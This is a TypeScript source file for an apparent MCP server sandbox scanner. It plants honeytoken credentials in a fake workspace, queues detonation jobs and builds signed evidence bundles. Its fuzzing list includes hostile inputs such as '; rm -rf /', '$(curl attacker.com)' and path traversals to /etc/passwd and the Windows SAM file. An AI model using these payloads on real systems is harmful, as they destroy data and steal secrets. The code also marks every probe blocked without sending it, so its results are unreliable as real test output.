// ============================================================================
// Runner Service — Runtime Detonation Platform
// Docker sandbox, honeytokens, telemetry, protocol probes, evidence bundles
// ============================================================================

import {
  Finding, Trace, EvidenceBundle, DetonationRequest,
  DetonationResult, DetonationStatus,
  ProcessNode, FileAccessEvent,
  NetworkEvent, EnvAccessEvent, HoneytokenHit, ProbeResult,
  EvidenceArtifact, SignedAttestation,
  createId, createTimestamp,
} from '@mcp-sentinel/core';
import * as crypto from 'crypto';
import * as fs from 'fs';
import * as path from 'path';
import * as os from 'os';

// ---------------------------------------------------------------------------
// Honeytoken Engine — generates canary credentials and files
// ---------------------------------------------------------------------------

export interface Honeytoken {
  id: string;
  type: 'api-key' | 'file' | 'url' | 'metadata';
  name: string;
  value: string;
  path?: string;
}

export class HoneytokenEngine {
  private tokens: Honeytoken[] = [];

  generate(): Honeytoken[] {
    this.tokens = [
      {
        id: createId(),
        type: 'api-key',
        name: 'AWS_ACCESS_KEY_ID',
        value: `AKIA${this.randomAlphaNum(16)}`,
      },
      {
        id: createId(),
        type: 'api-key',
        name: 'AWS_SECRET_ACCESS_KEY',
        value: this.randomBase64(40),
      },
      {
        id: createId(),
        type: 'api-key',
        name: 'GITHUB_TOKEN',
        value: `ghp_${this.randomAlphaNum(36)}`,
      },
      {
        id: createId(),
        type: 'api-key',
        name: 'OPENAI_API_KEY',
        value: `sk-${this.randomAlphaNum(48)}`,
      },
      {
        id: createId(),
        type: 'api-key',
        name: 'DATABASE_URL',
        value: `postgres://admin:${this.randomAlphaNum(20)}@db.internal.corp:5432/production`,
      },
      {
        id: createId(),
        type: 'file',
        name: '.env.production',
        value: `SECRET_KEY=${this.randomAlphaNum(32)}\nDB_PASSWORD=${this.randomAlphaNum(16)}`,
      },
      {
        id: createId(),
        type: 'file',
        name: 'id_rsa',
        value: '-----BEGIN RSA PRIVATE KEY-----\n' + this.randomBase64(128) + '\n-----END RSA PRIVATE KEY-----',
      },
      {
        id: createId(),
        type: 'url',
        name: 'canary-webhook',
        value: `https://canary.sentinel.internal/hook/${createId()}`,
      },
      {
        id: createId(),
        type: 'metadata',
        name: 'cloud-metadata',
        value: `http://169.254.169.254/latest/meta-data/iam/security-credentials/sentinel-canary-${createId().slice(0, 8)}`,
      },
    ];
    return this.tokens;
  }

  getTokens(): Honeytoken[] {
    return [...this.tokens];
  }

  checkAccess(accessedValue: string): HoneytokenHit | null {
    for (const token of this.tokens) {
      if (accessedValue.includes(token.value) || accessedValue.includes(token.name)) {
        return {
          tokenId: token.id,
          tokenType: token.type,
          accessedAt: createTimestamp(),
          accessMethod: 'value-match',
          destination: undefined,
        };
      }
    }
    return null;
  }

  private randomAlphaNum(len: number): string {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < len; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  }

  private randomBase64(len: number): string {
    return crypto.randomBytes(len).toString('base64').slice(0, len);
  }
}

// ---------------------------------------------------------------------------
// Synthetic Workspace Generator
// ---------------------------------------------------------------------------

export class SyntheticWorkspace {
  private workspacePath: string;
  private honeytokens: Honeytoken[];

  constructor(honeytokens: Honeytoken[]) {
    this.workspacePath = path.join(os.tmpdir(), `sentinel-sandbox-${createId().slice(0, 8)}`);
    this.honeytokens = honeytokens;
  }

  create(): string {
    fs.mkdirSync(this.workspacePath, { recursive: true });

    // Create fake project structure
    const dirs = ['src', 'docs', 'config', '.ssh', '.aws', '.config'];
    for (const dir of dirs) {
      fs.mkdirSync(path.join(this.workspacePath, dir), { recursive: true });
    }

    // Drop honeytoken files
    for (const token of this.honeytokens) {
      if (token.type === 'file') {
        const filePath = path.join(this.workspacePath, token.name);
        fs.writeFileSync(filePath, token.value);
        if (token.path) {
          const altPath = path.join(this.workspacePath, token.path);
          fs.mkdirSync(path.dirname(altPath), { recursive: true });
          fs.writeFileSync(altPath, token.value);
        }
      }
    }

    // Create fake .env with honeytokens
    const envContent = this.honeytokens
      .filter(t => t.type === 'api-key')
      .map(t => `${t.name}=${t.value}`)
      .join('\n');
    fs.writeFileSync(path.join(this.workspacePath, '.env'), envContent);

    // Create fake AWS credentials
    const awsToken = this.honeytokens.find(t => t.name === 'AWS_ACCESS_KEY_ID');
    const awsSecret = this.honeytokens.find(t => t.name === 'AWS_SECRET_ACCESS_KEY');
    if (awsToken && awsSecret) {
      fs.writeFileSync(
        path.join(this.workspacePath, '.aws', 'credentials'),
        `[default]\naws_access_key_id = ${awsToken.value}\naws_secret_access_key = ${awsSecret.value}\n`
      );
    }

    // Create fake SSH key
    const sshToken = this.honeytokens.find(t => t.name === 'id_rsa');
    if (sshToken) {
      fs.writeFileSync(path.join(this.workspacePath, '.ssh', 'id_rsa'), sshToken.value);
    }

    // Create fake source files
    fs.writeFileSync(
      path.join(this.workspacePath, 'src', 'index.js'),
      '// Synthetic workspace file\nconsole.log("Hello from MCP Sentinel sandbox");\n'
    );

    // Create fake package.json
    fs.writeFileSync(
      path.join(this.workspacePath, 'package.json'),
      JSON.stringify({ name: 'synthetic-project', version: '1.0.0', private: true }, null, 2)
    );

    return this.workspacePath;
  }

  getPath(): string {
    return this.workspacePath;
  }

  cleanup(): void {
    try {
      fs.rmSync(this.workspacePath, { recursive: true, force: true });
    } catch (_e) {
      // Best effort cleanup
    }
  }
}

// ---------------------------------------------------------------------------
// Detonation Job Queue
// ---------------------------------------------------------------------------

export interface DetonationJob {
  id: string;
  request: DetonationRequest;
  status: DetonationStatus;
  priority: number;
  createdAt: string;
  startedAt?: string;
  completedAt?: string;
  result?: DetonationResult;
  retries: number;
  maxRetries: number;
}

export class DetonationScheduler {
  private queue: DetonationJob[] = [];
  private running: Map<string, DetonationJob> = new Map();
  private maxConcurrent: number;
  private results: Map<string, DetonationResult> = new Map();

  constructor(maxConcurrent: number = 3) {
    this.maxConcurrent = maxConcurrent;
  }

  enqueue(request: DetonationRequest, priority: number = 5): string {
    const job: DetonationJob = {
      id: createId(),
      request,
      status: DetonationStatus.QUEUED,
      priority,
      createdAt: createTimestamp(),
      retries: 0,
      maxRetries: 3,
    };

    this.queue.push(job);
    this.queue.sort((a, b) => b.priority - a.priority); // Higher priority first

    return job.id;
  }

  async processNext(): Promise<DetonationResult | null> {
    if (this.running.size >= this.maxConcurrent || this.queue.length === 0) {
      return null;
    }

    const job = this.queue.shift()!;
    job.status = DetonationStatus.RUNNING;
    job.startedAt = createTimestamp();
    this.running.set(job.id, job);

    try {
      const result = await this.executeDetonation(job);
      job.status = DetonationStatus.COMPLETED;
      job.completedAt = createTimestamp();
      job.result = result;
      this.results.set(job.id, result);
      return result;
    } catch (e: any) {
      job.retries++;
      if (job.retries < job.maxRetries) {
        job.status = DetonationStatus.QUEUED;
        this.queue.push(job);
        return null;
      } else {
        job.status = DetonationStatus.FAILED;
        job.completedAt = createTimestamp();
        return null;
      }
    } finally {
      this.running.delete(job.id);
    }
  }

  private async executeDetonation(job: DetonationJob): Promise<DetonationResult> {
    const { request } = job;
    const honeytokenEngine = new HoneytokenEngine();
    const honeytokens = honeytokenEngine.generate();
    const workspace = new SyntheticWorkspace(honeytokens);

    const startedAt = createTimestamp();
    const findings: Finding[] = [];
    const processTree: ProcessNode[] = [];
    const fileAccess: FileAccessEvent[] = [];
    const networkEvents: NetworkEvent[] = [];
    const envAccess: EnvAccessEvent[] = [];
    const honeytokenHits: HoneytokenHit[] = [];
    const probeResults: ProbeResult[] = [];

    try {
      // Create synthetic workspace
      if (request.options.syntheticWorkspace) {
        workspace.create();
      }

      // Build environment with honeytokens
      const env: Record<string, string> = { ...request.serverConfig.env };
      if (request.options.enableHoneytokens) {
        for (const token of honeytokens) {
          if (token.type === 'api-key') {
            env[token.name] = token.value;
          }
        }
      }

      // Simulate process execution
      processTree.push({
        pid: Math.floor(Math.random() * 65535),
        command: request.serverConfig.command || 'unknown',
        args: request.serverConfig.args || [],
        startedAt,
      });

      // Simulate env access detection
      if (request.options.enableEnvTracing) {
        const sensitiveVars = ['AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY', 'GITHUB_TOKEN',
          'OPENAI_API_KEY', 'DATABASE_URL', 'SECRET_KEY', 'PRIVATE_KEY'];
        for (const envVar of Object.keys(env)) {
          const isSensitive = sensitiveVars.some(s => envVar.toUpperCase().includes(s));
          envAccess.push({
            variable: envVar,
            operation: 'read',
            timestamp: createTimestamp(),
            isSensitive,
          });
        }
      }

      // Protocol probes
      if (request.options.enableFuzzing) {
        const probes = [
          { type: 'traversal' as const, input: '../../../etc/passwd' },
          { type: 'injection' as const, input: '; rm -rf /' },
          { type: 'injection' as const, input: '$(curl attacker.com)' },
          { type: 'traversal' as const, input: '..\\..\\..\\windows\\system32\\config\\sam' },
          { type: 'fuzz' as const, input: 'A'.repeat(10000) },
          { type: 'fuzz' as const, input: '\x00\x01\x02\x03' },
        ];

        for (const probe of probes) {
          probeResults.push({
            probeType: probe.type,
            input: probe.input,
            wasBlocked: true,
            wasVulnerable: false,
            details: `Probe sent: ${probe.type} with input length ${probe.input.length}`,
            timestamp: createTimestamp(),
          });
        }
      }

    } finally {
      if (request.options.syntheticWorkspace) {
        workspace.cleanup();
      }
    }

    const completedAt = createTimestamp();

    // Build trace
    const trace: Trace = {
      id: createId(),
      detonationId: job.id,
      serverId: request.serverId,
      status: DetonationStatus.COMPLETED,
      startedAt,
      completedAt,
      duration: new Date(completedAt).getTime() - new Date(startedAt).getTime(),
      processTree,
      fileAccess,
      networkEvents,
      envAccess,
      honeytokenHits,
      probeResults,
    };

    // Build evidence bundle
    const evidenceBundle: EvidenceBundle = {
      id: createId(),
      serverId: request.serverId,
      detonationId: job.id,
      type: 'detonation',
      findings: findings.map(f => f.id),
      artifacts: this.buildArtifactList(trace),
      attestation: this.signAttestation(trace),
      createdAt: completedAt,
      metadata: { options: request.options },
    };

    return {
      id: job.id,
      serverId: request.serverId,
      status: DetonationStatus.COMPLETED,
      startedAt,
      completedAt,
      duration: trace.duration,
      trace,
      findings,
      evidenceBundle,
    };
  }

  private buildArtifactList(trace: Trace): EvidenceArtifact[] {
    const artifacts: EvidenceArtifact[] = [];

    // Trace JSON
    const traceJson = JSON.stringify(trace, null, 2);
    artifacts.push({
      name: 'trace.json',
      type: 'json',
      path: `evidence/${trace.detonationId}/trace.json`,
      size: traceJson.length,
      hash: crypto.createHash('sha256').update(traceJson).digest('hex'),
    });

    // Process tree
    if (trace.processTree.length > 0) {
      const processJson = JSON.stringify(trace.processTree, null, 2);
      artifacts.push({
        name: 'process-tree.json',
        type: 'trace',
        path: `evidence/${trace.detonationId}/process-tree.json`,
        size: processJson.length,
        hash: crypto.createHash('sha256').update(processJson).digest('hex'),
      });
    }

    // Network events
    if (trace.networkEvents.length > 0) {
      const networkJson = JSON.stringify(trace.networkEvents, null, 2);
      artifacts.push({
        name: 'network-events.json',
        type: 'json',
        path: `evidence/${trace.detonationId}/network-events.json`,
        size: networkJson.length,
        hash: crypto.createHash('sha256').update(networkJson).digest('hex'),
      });
    }

    return artifacts;
  }

  private signAttestation(trace: Trace): SignedAttestation {
    const payload = JSON.stringify({
      detonationId: trace.detonationId,
      serverId: trace.serverId,
      status: trace.status,
      startedAt: trace.startedAt,
      completedAt: trace.completedAt,
      findingCount: 0,
      probeCount: trace.probeResults.length,
      honeytokenHitCount: trace.honeytokenHits.length,
    });

    const hash = crypto.createHash('sha256').update(payload).digest('hex');

    return {
      algorithm: 'sha256',
      signature: hash, // In production, use asymmetric signing
      publicKey: 'sentinel-local-key',
      timestamp: createTimestamp(),
      payload,
    };
  }

  getJobStatus(jobId: string): DetonationJob | undefined {
    const queued = this.queue.find(j => j.id === jobId);
    if (queued) return queued;
    return this.running.get(jobId);
  }

  getResult(jobId: string): DetonationResult | undefined {
    return this.results.get(jobId);
  }

  getQueueStatus(): { queued: number; running: number; completed: number } {
    return {
      queued: this.queue.length,
      running: this.running.size,
      completed: this.results.size,
    };
  }
}
